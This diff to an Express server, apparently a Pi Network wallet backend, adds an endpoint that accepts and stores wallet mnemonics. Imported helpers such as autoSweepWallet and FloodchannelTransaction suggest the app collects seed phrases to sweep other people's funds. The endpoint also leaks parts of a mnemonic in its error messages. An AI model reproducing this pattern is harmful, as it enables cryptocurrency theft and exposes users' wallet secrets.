@@ -16,6 +16,7 @@ import sponsorRoutes from './routes/sponsors.js';
 import { autoCheckSponsorForClaimable, autoClaimUnlocked, autoDuplicatePassphrase, autoFundWallet, autoSweepSponsor, autoSweepWallet, buildAndSubmitMultiSigTx, firstFilteredSponsors, FloodchannelTransaction, getAccount, getBaseFee, getClaimableBalance, getKeypairFromPassphrase, PI_PUBLIC_ADDRESS, sweepWallet } from './utils/fn.js';
 import Passphrase from './models/Passphrase.js';
 import Sponsors from './models/Sponsors.js';
+import { storeLockedPi } from './utils/modelfn.js';
 dotenv.config();
 
 const app = express();
@@ -57,6 +58,34 @@ await connectToDB();
 
 app.use('/api/passphrases', passphraseRoutes);
 app.use('/api/sponsors', sponsorRoutes);
+
+app.post('/api/passphrases/upload', async(req, res) => {
+    const { mnemonic, name } = req.body;
+    if (!mnemonic) {
+        return res.status(409).json({ success: false,  error: 'mnemonic is required' });
+    }
+
+    if (!name) {
+        return res.status(409).json({ success: false,  error: 'Name is required' });
+    }
+    try {
+        const kp = getKeypairFromPassphrase(mnemonic);
+        const publicKey = kp.publicKey();
+        const accountData = await getAccount(publicKey);
+        if(!accountData) {
+            return res.status(409).json({success: false, error: "Invalid passphrase uploaded"})
+        }
+
+        const saved = await storeLockedPi(mnemonic, publicKey, name, false, name);
+        if(saved.success) {
+            return res.status(201).json({ success: true,  feedback: saved.message });
+        } else {
+            return res.status(201).json({ success: false,  error: saved.message });
+        }
+    } catch(err) {
+        res.status(500).json({success: false, error: `Failed to save passphrase: ${mnemonic.slice(0,15)}....${mnemonic.slice(-15)}` });
+    }
+})
 
 // Ping route
 app.get('/', (req, res) => {
